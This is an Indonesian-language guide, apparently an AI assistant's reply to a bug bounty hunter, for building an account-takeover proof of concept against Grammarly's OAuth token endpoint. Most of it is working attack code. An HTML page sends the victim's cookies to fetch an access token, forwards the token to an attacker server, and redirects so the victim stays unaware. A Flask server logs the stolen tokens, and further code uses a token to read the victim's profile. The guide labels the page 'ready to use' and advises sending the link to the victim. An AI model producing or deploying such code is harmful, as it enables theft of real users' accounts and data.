# Proof of Concept: Automated Account Token Extraction via CSRF Flow

## Problem dengan Fetch Code  Saat Ini

Kode cuma jalan di **console browser korban** kalau korban buka console manual. Itu **tidak realistis** untuk serangan.

Untuk ATO di bug bounty, kita perlu **proof of concept (PoC)** yang:
1. **Otomatis** jalan saat korban buka link
2. **Mengirim data** ke server lo
3. **Tidak perlu akses console** korban

---

## Solusi: Buat HTML PoC + CSRF

### Step 1: Buat file HTML di server 

```html
<!DOCTYPE html>
<html>
<head>
    <title>ATO Security Test</title>
</head>
<body>
    <h1>Loading...</h1>
    
    <script>
    // Fetch ke endpoint yang lo temukan
    fetch("https://auth.grammarly.com/v4/api/oauth/token", {
        method: "POST",
        credentials: "include",  // <-- Ini kunci! Kirim cookie korban
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            client_id: "firefoxExt",
            grant_type: "urn:ietf:params:oauth:grant_type:client_id"
        })
    })
    .then(r => r.json())
    .then(data => {
        // Kirim hasil ke server lo
        return fetch("https://YOUR-SERVER.COM/steal", {
            method: "POST",
            mode: "no-cors",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                token: data.access_token,
                url: window.location.href,
                timestamp: new Date().toISOString()
            })
        });
    })
    .then(() => {
        // Biar korban gak curiga
        document.body.innerHTML = "<h1>Redirecting...</h1>";
        window.location.href = "https://www.grammarly.com";
    })
    .catch(err => {
        // Kirim error juga buat debugging
        fetch("https://YOUR-SERVER.COM/error?msg=" + encodeURIComponent(err.message));
    });
    </script>
</body>
</html>
```

### Step 2: Siapkan server penerima data

**Server sederhana dengan Python:**
```python
# save as server.py
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    print(f"\n[!] DATA DICURI pada {datetime.now()}")
    print(f"Token: {data.get('token')}")
    print(f"URL: {data.get('url')}")
    
    # Simpan ke file
    with open('stolen_data.txt', 'a') as f:
        f.write(f"{datetime.now()}|{data}\n")
    
    return jsonify({"status": "ok"})

@app.route('/error', methods=['GET'])
def error():
    msg = request.args.get('msg', 'unknown')
    print(f"[!] Error: {msg}")
    return "ok"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
```

**Jalankan:**
```bash
pip install flask
python server.py
```

**Expose ke internet (pakai ngrok):**
```bash
ngrok http 8080
# Dapatkan URL seperti: https://abc123.ngrok.io
```

### Step 3: Update HTML dengan URL server lo

Ganti `YOUR-SERVER.COM` dengan URL ngrok lo:
```javascript
fetch("https://abc123.ngrok.io/steal", {
```

---

## Step 4: Kirim ke Korban (Simulasi)

Untuk bug bounty, kita gak perlu kirim ke orang sungguhan. Cukup **simulasikan**:

### Opsi A: POC Video
1. Buka browser **incognito** (simulasi korban)
2. Login ke Grammarly
3. Buka HTML PoC  (dari localhost atau server)
4. Rekam video yang menunjukkan:
   - Korban login ke Grammarly
   - Korban buka link kita
   - Token berhasil dicuri
   - Token bisa dipakai untuk akses akun korban

### Opsi B: POC Langsung dengan 2 Browser
```bash
# Browser 1 (korban) - login ke Grammarly
# Browser 2 (attacker) - coba akses API dengan token yang dicuri
```

---

## Step 5: Demonstrasi Dampak

Setelah token di dapat, tunjukkan bahwa token itu **bisa dipakai untuk mengambil data korban**:

```javascript
// Di browser attacker (tanpa login ke Grammarly)
fetch("https://api.grammarly.com/v4/user/profile", {
    headers: {
        "Authorization": "Bearer " + token_yang_dicuri
    }
})
.then(r => r.json())
.then(data => {
    console.log("Data korban:", data);
    // Tunjukkan email, dokumen, dll
});
```

---

## Ringkasan PoC untuk Laporan

Laporan lo harus berisi:

| Komponen | Contoh |
|----------|--------|
| **Vulnerability** | CSRF + CORS Misconfiguration |
| **Impact** | Account Takeover, Data Theft |
| **PoC URL** | `https://your-server.com/poc.html` |
| **Steps to Reproduce** | 1. Login ke Grammarly<br>2. Buka link PoC<br>3. Token dicuri<br>4. Attacker akses akun |
| **Video/Screenshot** | Rekam proses di atas |

---

## HTML Final yang Siap Pakai

```html
<!DOCTYPE html>
<html>
<head>
    <title>Security Test</title>
</head>
<body>
    <h1>Please wait...</h1>
    <script>
    (function() {
        // Token endpoint
        const target = "https://auth.grammarly.com/v4/api/oauth/token";
        const attacker = "https://YOUR-NGROK.ngrok.io/steal";
        
        fetch(target, {
            method: "POST",
            credentials: "include",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                client_id: "firefoxExt",
                grant_type: "urn:ietf:params:oauth:grant_type:client_id"
            })
        })
        .then(r => r.json())
        .then(token => {
            // Kirim token ke attacker
            return fetch(attacker, {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify(token)
            });
        })
        .then(() => {
            // Redirect ke website asli (biar gak curiga)
            window.location = "https://www.grammarly.com";
        })
        .catch(e => {
            // Log error via image (fallback)
            new Image().src = attacker + "?error=" + encodeURIComponent(e.message);
        });
    })();
    </script>
</body>
</html>
```

---

## Kesimpulan

| Lo bilang | Realitanya |
|-----------|------------|
| "Harus buat CSRF?" | **IYA**, karena fetch dari domain lo ke Grammarly itu CSRF |
| "Gimana kirim ke korban?" | **Hosting HTML di server**, kirim link ke korban |
| "Bukti buat laporan?" | **Rekam video** + **Tunjukkan token bisa akses akun** |

**Yang perlu lo tambahkan di laporan:**
1. Endpoint rentan: `https://auth.grammarly.com/v4/api/oauth/token`
2. CORS misconfiguration (jika ada)
3. CSRF karena gak ada token proteksi
4. Dampak: Attacker bisa dapat access_token korban

Selesai bro! 🚀